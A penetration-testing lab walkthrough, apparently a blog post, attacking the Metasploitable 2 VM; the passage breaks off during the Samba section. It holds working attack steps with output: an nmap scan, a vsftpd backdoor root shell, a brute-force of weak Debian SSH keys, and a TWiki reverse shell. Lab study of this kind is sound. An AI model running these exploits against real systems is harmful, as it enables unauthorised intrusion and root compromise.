<p>Since this is a test lab, I won&rsquo;t be concerned about stealth. Instead, I will try to get the most information out of the scans.</p>

<p>Let&rsquo;s start by port scanning the target with nmap. I did a full port, aggresive scan against the target. Here are the results.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p1-65535 -A 192.168.127.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-03 21:33 EEST
</span><span class='line'>Nmap scan report for 192.168.127.154
</span><span class='line'>Host is up (0.00047s latency).
</span><span class='line'>Not shown: 65505 closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>21/tcp    open  ftp         vsftpd 2.3.4
</span><span class='line'>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
</span><span class='line'>|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
</span><span class='line'>23/tcp    open  telnet      Linux telnetd
</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
</span><span class='line'>|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Not valid before: 2010-03-17T14:07:45+00:00
</span><span class='line'>|_Not valid after:  2010-04-16T13:07:45+00:00
</span><span class='line'>|_ssl-date: 2014-06-03T18:35:26+00:00; -1s from local time.
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.4.2
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.4.2
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Metasploitable2 - Linux
</span><span class='line'>111/tcp   open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>512/tcp   open  exec        netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login?
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>1099/tcp  open  java-rmi    Java RMI Registry
</span><span class='line'>1524/tcp  open  shell       Metasploitable root shell
</span><span class='line'>2049/tcp  open  nfs         2-4 (RPC #100003)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>2121/tcp  open  ftp         ProFTPD 1.3.1
</span><span class='line'>3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 53
</span><span class='line'>|   Version: .0.51a-3ubuntu5
</span><span class='line'>|   Thread ID: 8
</span><span class='line'>|   Capabilities flags: 43564
</span><span class='line'>|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|_  Salt: (eFoz:O^m'yLR5Qw&RJ\
</span><span class='line'>3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</span><span class='line'>5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>5900/tcp  open  vnc         VNC (protocol 3.3)
</span><span class='line'>| vnc-info: 
</span><span class='line'>|   Protocol version: 3.3
</span><span class='line'>|   Security types: 
</span><span class='line'>|_    Unknown security type (33554432)
</span><span class='line'>6000/tcp  open  X11         (access denied)
</span><span class='line'>6667/tcp  open  irc         Unreal ircd
</span><span class='line'>| irc-info: 
</span><span class='line'>|   server: irc.Metasploitable.LAN
</span><span class='line'>|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
</span><span class='line'>|   servers: 1
</span><span class='line'>|   users: 1
</span><span class='line'>|   lservers: 0
</span><span class='line'>|   lusers: 1
</span><span class='line'>|   uptime: 0 days, 0:07:28
</span><span class='line'>|   source host: 7FA0EA81.B1DFC955.FFFA6D49.IP
</span><span class='line'>|_  source ident: nmap
</span><span class='line'>6697/tcp  open  irc         Unreal ircd
</span><span class='line'>8009/tcp  open  ajp13?
</span><span class='line'>| ajp-auth: 
</span><span class='line'>|_  ERROR: Failed to connect to AJP server
</span><span class='line'>| ajp-methods: 
</span><span class='line'>|_  ERROR: Failed to connect to server
</span><span class='line'>8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
</span><span class='line'>34130/tcp open  status      1 (RPC #100024)
</span><span class='line'>46385/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>50867/tcp open  unknown
</span><span class='line'>53013/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>MAC Address: 00:0C:29:2E:6D:70 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.20-Debian)
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Workgroup: WORKGROUP
</span><span class='line'>|_  System time: 2014-06-03T14:35:26-04:00
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.47 ms 192.168.127.154
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 284.64 seconds</span></code></pre></td></tr></table></div></figure>


<p>Ok, there are plenty of services just waiting for our attention. So let&rsquo;s check each port and see what we get.</p>

<h3>Port 21 vsftpd</h3>

<p>There is an exploit available in Metasploit for the vsftpd version.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; search vsftpd
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                  Disclosure Date  Rank       Description
</span><span class='line'>   ----                                  ---------------  ----       -----------
</span><span class='line'>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution</span></code></pre></td></tr></table></div></figure>


<p>The description from Rapid7 site:</p>

<p><strong>VSFTPD v2.3.4 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the
vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was
removed on July 3rd 2011.</p></blockquote>

<p>Let&rsquo;s leverage it and get a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name               Disclosure Date  Rank    Description
</span><span class='line'>   ----               ---------------  ----    -----------
</span><span class='line'>   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set payload cmd/unix/interact
</span><span class='line'>payload =&gt; cmd/unix/interact
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/interact):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Banner: 220 (vsFTPd 2.3.4)
</span><span class='line'>[*] USER: 331 Please specify the password.
</span><span class='line'>[+] Backdoor service has been spawned, handling...
</span><span class='line'>[+] UID: uid=0(root) gid=0(root)
</span><span class='line'>[*] Found shell.
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:57936 -&gt; 192.168.127.154:6200) at 2014-06-03 22:42:36 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>uname -a
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Aaand we own the machine! Now let&rsquo;s move on.</p>

<h3>Port 22 ssh</h3>

<p>The OpenSSL package installed on the system is vulnerable to a bruteforce exploit  due to a random number generator weakness. Here&rsquo;s the overview and the CVE number:</p>

<p><strong>CVE-2008-0166</strong></p>

<blockquote><p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable > numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p></blockquote>

<p>I chose the following Ruby exploit:</p>

<p><a href="http://www.exploit-db.com/exploits/5632/">http://www.exploit-db.com/exploits/5632/</a></p>

<p>Before running it, you have to download the precalculated vulnerable keys from:</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2</a>  # for dsa keys</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a> # for rsa keys</p>

<p>Then I ran the script as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby ./5632.rb 192.168.127.154 root ~/rsa/2048/</span></code></pre></td></tr></table></div></figure>


<p>You can consult the source for more information, basically this checks if the root account has a weak SSH key, testing each key in the directory where you placed the keys. Upon a hit, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>KEYFILE FOUND:
</span><span class='line'>
</span><span class='line'>57c3115d77c56390332dc5c49978627a-5429</span></code></pre></td></tr></table></div></figure>


<p>After finding the key, you can use it to log in as root via ssh:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -l root -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.127.154</span></code></pre></td></tr></table></div></figure>


<h3>Port 23 telnet</h3>

<p>For this one I used an auxiliary module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>msf auxiliary(telnet_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/telnet/telnet_version):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   RHOSTS                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT     23               yes       The target port
</span><span class='line'>   THREADS   1                yes       The number of concurrent threads
</span><span class='line'>   TIMEOUT   30               yes       Timeout for the Telnet probe
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>msf auxiliary(telnet_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(telnet_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:23 TELNET _                  _       _ _        _     _      ____  \x0a _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |\x0a| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ \x0a|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a                            |_|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So now we know the credentials for the msfadmin account, and if you log in and play around you will find out that this accound has sudo privilege, so it&rsquo;s possible to run commands as root.</p>

<h3>Port 80 apache</h3>

<p>Navigating to the root of the web server, we can see some vulnerable web applications, along with the msfadmin account details which we got earlier with telnet. I won&rsquo;t go over the web applications here, because I am focusing on host based exploitation in this post. However, I found out that I could use Metasploit against one of them to get a shell, so I will detail that here.</p>

<p>The Nessus scan revealed that the TWiki web application is vulnerable to remote code execution. I found the following suitable exploit:</p>

<p><strong>TWiki History TWikiUsers rev Parameter Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability in the history component of TWiki. By passing a &lsquo;rev&rsquo; parameter containing shell metacharacters to the
TWikiUsers script, an attacker can execute arbitrary OS commands.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/webapp/twiki_history
</span><span class='line'>msf exploit(twiki_history) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/webapp/twiki_history):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        Use a proxy chain
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /twiki/bin       yes       TWiki bin directory path
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(twiki_history) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(twiki_history) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(twiki_history) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo ZeiYbclsufvu4LGM;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Successfully sent exploit request
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "ZeiYbclsufvu4LGM\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo D0Yvs2n6TnTUDmPF;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:54381) at 2014-06-08 17:31:48 +0300
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "D0Yvs2n6TnTUDmPF\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>This is a low privilege shell, but we can escalate to root via the udev exploit, as shown later.</p>

<h3>Port 445 samba</h3>

<p>First, I&rsquo;ll use an auxiliary module to get the server&rsquo;s version:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/smb/smb_version
</span><span class='line'>msf auxiliary(smb_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/smb/smb_version):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   RHOSTS                      yes       The target address range or CIDR identifier
